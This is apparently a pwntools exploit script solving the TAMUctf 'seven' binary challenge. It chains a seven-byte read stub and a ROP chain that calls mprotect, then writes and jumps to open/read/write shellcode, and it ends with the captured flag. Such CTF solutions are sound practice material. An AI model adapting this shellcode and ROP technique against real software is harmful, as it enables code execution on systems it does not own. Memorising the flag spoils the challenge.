from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./seven_patched', '''
    b *(main+118)
    continue
''')

# p = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_seven")

# execve syscall and execveat syscall are forbidden
# only a seven-byte shellcode is allowed to inject
# after reading in a seven-byte shellcode, 0x500000-0x501000 region is set to be readable and executable, but not writable

# 1. use a seven-byte shellcode to trigger read(0, $rsp, 0x500000) to read a ROP chain to stack starting from $rsp
seven_byte_shellcode = asm('''
    /* read(0, $rsp, 0x500000) */
    /* rax=0 and rdx=0x500000 is already set in context */
    xor edi, edi
    push rsp
    pop rsi
    syscall
    ret
''')
p.send(seven_byte_shellcode)

# 2. use three special gadgets to ROP for long shellcode injection
GADGET_1 = 0x401362  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
GADGET_2 = 0x401348  # mov rdx, r15; mov rsi, r14; mov edi, r13; call qword ptr [r12+rbx*8]; add rbx, 0x1; cmp rbp, rbx; jne 0x401348; add rsp, 0x8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
GADGET_3 = 0x401218  # add dword ptr [rbp - 0x3d], ebx; nop dword ptr [rax + rax]; ret;
MPROTECT_GOT = 0x403fe8
shellcode = asm('''
    /* push filename 'flag.txt\x00' to stack */
    mov rsi, 0
    push rsi
    mov rsi, 0x7478742e67616c66
    push rsi
    /* open("flag.txt", 0, 0) */
    mov rax, 2
    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    syscall
    /* read(fd, 0x500500, 128) */
    mov rdi, rax
    mov rax, 0
    mov rsi, 0x500500
    mov rdx, 128
    syscall
    /* write(1, 0x500500, 128) */
    mov rax, 1
    mov rdi, 1
    mov rsi, 0x500500
    mov rdx, 128
    syscall
''')  # shellcode to trigger open&read&write to retrieve flag
payload = b''
# trigger mprotect(0x500000, 0x1000, 7) to make 0x500000-0x501000 region writable
payload += p64(GADGET_1)+p64(0)+p64(1)+p64(MPROTECT_GOT)+p64(0x500000)+p64(0x1000)+p64(0x7)+p64(GADGET_2)+p64(0)  # ensure "add rbx, 0x1; cmp rbp, rbx; add rsp, 0x8;" in GADGET_2
# write shellcode to writable region starting from 0x500007 four bytes at a time
position = 0
while position < len(shellcode):
    four_bytes = shellcode[position:position + 4]
    if position != 0:
        payload += p64(GADGET_1)+four_bytes.ljust(8, b'\x00')+p64(0x500007+position+0x3d)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(GADGET_3)  # ensure "add dword ptr [rbp - 0x3d], ebx;" in GADGET_3
    else:
        payload += four_bytes.ljust(8, b'\x00')+p64(0x500007+position+0x3d)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(GADGET_3)  # ensure "add dword ptr [rbp - 0x3d], ebx;" in GADGET_3
    position += 4
# jump to starting address 0x500007 to execute shellcode just written
payload += p64(0x500007)
p.send(payload)

p.interactive()

# gigem{my_challenge_names_are_so_creative_right}